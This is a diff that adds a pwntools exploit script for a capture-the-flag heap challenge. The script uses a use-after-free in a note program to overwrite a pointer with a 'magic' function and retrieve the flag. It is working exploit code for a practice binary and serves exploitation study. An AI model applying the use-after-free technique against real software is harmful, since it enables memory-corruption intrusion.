@@ -95,3 +95,38 @@
  'the necessary permissions to execute it. If the binary requires specific '
  'libraries or is intended to run on a particular environment, you may need to '
  'set up an appropriate environment or use a virtual machine.')
+
+from pwn import *
+
+# Configure pwntools for the correct architecture
+context.update(arch='i386', os='linux')
+
+# Load the binary
+elf = ELF('./pwn/heap/heap-1/heap1')
+
+# Start the target process
+p = process('./pwn/heap/heap-1/heap1')
+
+# Helper functions for interacting with the program's menu
+def add_note(size, content):
+    p.sendlineafter('choice:', '1')
+    p.sendlineafter('Note size :', str(size))
+    p.sendafter('Content :', content)
+
+def delete_note(index):
+    p.sendlineafter('choice:', '2')
+    p.sendlineafter('Index :', str(index))
+
+def print_note(index):
+    p.sendlineafter('choice:', '3')
+    p.sendlineafter('Index :', str(index))
+
+# Perform the steps described above
+add_note(32, b'A' * 32)        # Step 1: Allocate Note A
+add_note(32, b'B' * 32)        # Step 2: Allocate Note B
+delete_note(0)                 # Step 3: Free Note A
+add_note(8, p32(elf.symbols['magic']))  # Step 4: Overlap with Note A
+print_note(0)                  # Step 5: Trigger the exploit
+
+# Interact with the process to retrieve the flag
+p.interactive()
